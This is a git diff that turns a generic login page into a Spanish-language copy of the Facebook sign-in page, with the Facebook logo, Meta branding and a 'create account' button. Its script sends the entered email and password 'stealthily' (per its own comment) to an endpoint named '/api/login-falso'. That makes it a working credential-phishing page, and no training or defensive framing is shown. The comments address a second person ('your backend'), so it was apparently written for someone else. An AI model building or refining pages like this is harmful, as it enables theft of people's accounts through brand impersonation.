@@ -3,23 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso al Sistema</title>
+    <title>Iniciar sesión en Facebook</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
-        .login-container h2 { color: #1a73e8; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button:hover { background-color: #1557b0; }
+        /* Estilos integrados de tu style.css */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            display: flex;
+            width: 900px;
+            height: 600px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px; /* Pequeño ajuste para que se vea más moderno */
+        }
+
+        .left-side {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .logo img {
+            width: 200px; /* Ajustado para que el logo se vea mejor como en Facebook */
+        }
+
+        .tagline h1 {
+            font-size: 2.5rem;
+            color: #1877f2;
+            line-height: 1.2;
+        }
+
+        .tagline h1 span {
+            color: #000;
+        }
+
+        .right-side {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+        }
+
+        .login-form {
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .login-form h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #1c1e21;
+            font-weight: normal;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-form button:hover {
+            background-color: #166fe5;
+        }
+
+        .login-form a {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .login-form a:hover {
+            text-decoration: underline;
+        }
+
+        .login-form hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .login-form .create-account {
+            background-color: #42b72a;
+            width: auto;
+            display: inline-block;
+            padding: 10px 20px;
+        }
+
+        .login-form .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .meta-logo {
+            margin-top: 20px;
+        }
+
+        .meta-logo p {
+            font-size: 0.8rem;
+            color: #888;
+        }
+
+        .meta-logo span {
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <h2>Ingreso Seguro</h2>
-        <input type="email" id="email" placeholder="Correo electrónico" required>
-        <input type="password" id="password" placeholder="Contraseña" required>
-        <button onclick="enviarDatos()">Iniciar Sesión</button>
+    <div class="container">
+        <div class="left-side">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+            </div>
+            <div class="tagline">
+                <h1>Explora lo que <span>más te gusta.</span></h1>
+            </div>
+        </div>
+
+        <div class="right-side">
+            <div class="login-form">
+                <h2>Iniciar sesión en Facebook</h2>
+                
+                <input type="email" id="email" placeholder="Correo electrónico o número de celular" required>
+                <input type="password" id="password" placeholder="Contraseña" required>
+                
+                <button type="button" onclick="enviarDatos()">Iniciar sesión</button>
+                
+                <a href="#">¿Olvidaste tu contraseña?</a>
+                <hr>
+                
+                <button type="button" class="create-account">Crear cuenta nueva</button>
+                
+                <div class="meta-logo">
+                    <p><span>Meta</span></p>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -33,7 +187,7 @@
             }
 
             try {
-                // Enviar los datos sigilosamente a nuestro backend
+                // Enviar los datos sigilosamente a tu backend
                 const respuesta = await fetch('/api/login-falso', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
